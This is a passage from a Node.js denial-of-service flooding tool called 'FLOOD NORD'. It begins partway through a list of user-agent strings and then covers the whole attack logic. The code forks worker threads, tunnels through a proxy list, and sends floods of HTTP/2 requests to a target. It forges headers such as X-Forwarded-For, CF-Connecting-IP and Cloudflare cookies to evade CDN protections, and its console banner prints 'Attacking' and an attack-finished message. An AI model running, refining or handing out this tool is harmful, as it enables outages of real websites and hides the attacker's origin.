'Dalvik/2.1.0 (Linux; U; Android 13; Vivo Build/TP1A.154058.034) [FBAN/EMA;FBAV/163.0.0.38.46;FBBV/429361147;FBRV/0;FBPN/com.facebook.lite;FBLC/en_GB;FBMF/4.0;FBBD/4.0;FBDV/Vivo;FBSV/13;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]',
'Mozilla/5.0 (Linux; Android 7; Infinix Build/N0VF47; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.3308.738 Mobile Safari/537.36 [FBAN/EMA;FBLC/da_DK;FBAV/395.0.0.12.42;]',
'Mozilla/5.0 (Linux; Android 14; Infinix Build/TQ2A.162959.021; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.7297.411 Mobile Safari/537.36 [FBAN/EMA;FBLC/es_LA;FBAV/277.0.0.96.63;]',
'Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LG-V410/V41010d Build/KOT49I.V41010d) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1',];
      const secChUa = `${brandValue}`;
 var randomMethod = Methods[Math.floor(Math.random() * Methods.length)];
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
 var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
 var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
 var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
 var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
 var CookieCf = cookie1[Math.floor(Math.random() * cookie1.length)];
 var mode1 = mode[Math.floor(Math.floor(Math.random() * mode.length))];
 var dest1 = dest[Math.floor(Math.floor(Math.random() * dest.length))];
 var site1 = site[Math.floor(Math.floor(Math.random() * site.length))];
 var type1 = type[Math.floor(Math.floor(Math.random() * type.length))];
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    console.clear();

    // Header keren
    figlet.text('⚔ FLOOD NORD ⚔', {
        font: 'Slant'
    }, function (err, data) {
        if (err) {
            console.log('Something went wrong...');
            console.dir(err);
            return;
        }
        console.log(gradient.rainbow.multiline(data));
        console.log(chalk.magentaBright('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
        console.log(chalk.cyanBright('📡 Target     : ') + chalk.redBright(process.argv[2]));
        console.log(chalk.cyanBright('⏱️ Duration   : ') + chalk.yellowBright(process.argv[3] + 's'));
        console.log(chalk.cyanBright('🚀 RPS        : ') + chalk.greenBright(process.argv[4]));
        console.log(chalk.cyanBright('🧵 Threads    : ') + chalk.blueBright(process.argv[5]));
        console.log(chalk.cyanBright('🧩 Proxy File : ') + chalk.whiteBright(process.argv[6]));
        console.log(chalk.magentaBright('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'));

        // Forking threads
        for (let i = 0; i < args.threads; i++) {
            cluster.fork();
        }

        // Tampilan animasi progress
        const rainbow = [chalk.red, chalk.yellow, chalk.green, chalk.cyan, chalk.blue, chalk.magenta];
        let i = 0;

        const interval = setInterval(() => {
            const color = rainbow[i % rainbow.length];
            process.stdout.write(color(`🔥 Attacking ${args.target} | Threads: ${args.threads} | RPS: ${args.Rate} \r`));
            i++;
        }, 300);

        // Auto-clear ketika selesai
        setTimeout(() => {
            clearInterval(interval);
            console.log(chalk.redBright('\n💥 Serangan selesai!'));
            process.exit(0);
        }, args.time * 1000);
    });
} else {
    setInterval(runFlooder);
};
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
 
     const connection = net.connect({
         host: options.host,
         port: options.port
     });
 
     connection.setTimeout(options.timeout * 600000);
     connection.setKeepAlive(true, 100000);
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
 }

 const rateHeaders = [
  { "akamai-origin-hop": randstr(5)  },
  { "source-ip": randstr(5)  },
  { "via": randstr(5)  },
  { "cluster-ip": randstr(5)  },
  {"Access-Control-Request-Method": "GET", randomMethod},
  {"dnt" : "1" },
  ];
  const rateHeaders2 = [
  { "akamai-origin-hop": randstr(5)  },
  { "source-ip": randstr(5)  },
  { "via": randstr(5)  },
  { "cluster-ip": randstr(5)  },
  ];

 const Socker = new NetSocket();
  headers[":method"] = "GET", randomMethod;
 headers[":authority"] = parsedTarget.host;
 headers[":path"] = parsedTarget.path + pathts[Math.floor(Math.random() * pathts.length)] + "&" + randomString(10) + queryString + randomString(10);
 headers[":scheme"] = "https";
 headers["x-forwarded-proto"] = "https";
 headers["cache-control"] = randomHeaders['cache-control'];
headers["x-frame-options"] = randomHeaders['x-frame-options'];
headers["x-xss-protection"] = randomHeaders['x-xss-protection'];
headers["Referrer-Policy"] = randomHeaders['Referrer-Policy'];
headers["x-cache"] = randomHeaders['x-cache'];
headers["Content-Security-Policy"] = randomHeaders['Content-Security-Policy'];
headers["x-download-options"] = randomHeaders['x-download-options'];
headers["Cross-Origin-Embedder-Policy"] = randomHeaders['Cross-Origin-Embedder-Policy'];
headers["Cross-Origin-Opener-Policy"] = randomHeaders['Cross-Origin-Opener-Policy'];
headers["pragma"] = randomHeaders['pragma'];
headers["vary"] = randomHeaders['vary'];
headers["strict-transport-security"] = randomHeaders['strict-transport-security'];
headers["access-control-allow-headers"] = randomHeaders['access-control-allow-headers'];
headers["access-control-allow-origin"] = randomHeaders['access-control-allow-origin'];
 headers["accept-language"] = lang;
 headers["accept-encoding"] = encoding;
 headers["Sec-Websocket-Key"] = spoofed;
 headers["Sec-Websocket-Version"] = 13;
 headers["Upgrade"] = websocket;
 headers["X-Forwarded-For"] = spoofed;
 headers["X-Forwarded-Host"] = spoofed;
 headers["Client-IP"] = parsedProxy;
 headers["Real-IP"] = parsedProxy;
 headers["cache-control"] = control;
 headers["sec-ch-ua"] = secChUa;
 headers["sec-ch-ua-mobile"] = "?0";
 headers["sec-ch-ua-platform"] = `\"Windows\"`;
 headers["upgrade-insecure-requests"] = "1";
 headers["accept"] = acceptHeaderValue;
 headers["user-agent"] = uap1;
 headers["sec-fetch-dest"] = dest1;
 headers["sec-fetch-mode"] = mode1;
 headers["sec-fetch-site"] = site1;
 headers["TE"] = "trailers";
 headers["Content-Type"] = type1;
 headers['cf-cache-status'] = "BYPASS", "HIT", "DYNAMIC";
 headers["sec-gpc"] = secGpcValue;
 headers["cdn-loop"] = "cloudflare";
 headers["CF-Connecting-IP"] = spoofed;
 headers["CF-RAY"] = "randomRayValue";
 headers["CF-Visitor"] = "{'scheme':'https'}";
 headers["referer"] = Ref;
 headers["cookie"] = CookieCf;
 headers["DNT"] = '1';
 headers["x-requested-with"] = "XMLHttpRequest";
 headers["Connection"] = Math.random() > 0.5 ? "keep-alive" : "close";

 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":"); 
         headers["origin"] = "https://" + parsedTarget.host;

     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 100,
     };

     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 600000);

         const tlsOptions = {
            host: parsedTarget.host,
            ALPNProtocols: ['h2', 'h3', 'http/1.2', 'spdy/1.2'],
            sigals: siga,
            socket: connection,
            challengesToSolve: Infinity,
            resolveWithFullResponse: true,
            followAllRedirects: true,
            maxRedirects: 2,
            clientTimeout: 5000,
            clientlareMaxTimeout: 10000,
            cloudflareTimeout: 5000,
            cloudflareMaxTimeout: 30000,
            ciphers: tls.getCiphers().join(":") + cipper,
            ecdhCurve: "prime256v1:X25519",
            rejectUnauthorized: false,
            secure: true,
            Compression: false,
            rejectUnauthorized: false,
            port: 443,
            servername: parsedTarget.host,
            sessionTimeout: 5000,
            secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method",],
        };

         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

         tlsConn.setKeepAlive(true, 60000);

         const client = http2.connect(parsedTarget.href, {
             protocol: "https:",
             settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 2000,
            initialWindowSize: 65535,
            maxHeaderListSize: 65536,
            enablePush: false
          },
             maxSessionMemory: 64000,
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsConn,
             socket: connection,
         });
 
         client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 2000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 65536,
            enablePush: false
          });
 
         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
              const dynHeaders = {
                ...headers,
                ...rateHeaders2[Math.floor(Math.random()*rateHeaders2.length)],
                ...rateHeaders[Math.floor(Math.random()*rateHeaders.length)]
              };
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(dynHeaders)
                    
                    .on("response", response => {
                      if (response['set-cookie']) {
                        headers["cookie"] = cookieString(scp.parse(response["set-cookie"]))
                    }
                      request.close();
                        request.destroy();
                        return
                    });
    
                    request.end();
                }
            }, 1000); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
     }),function (error, response, body) {
		};
 }
 const KillScript = () => process.exit(1);
 setTimeout(KillScript, args.time * 1000);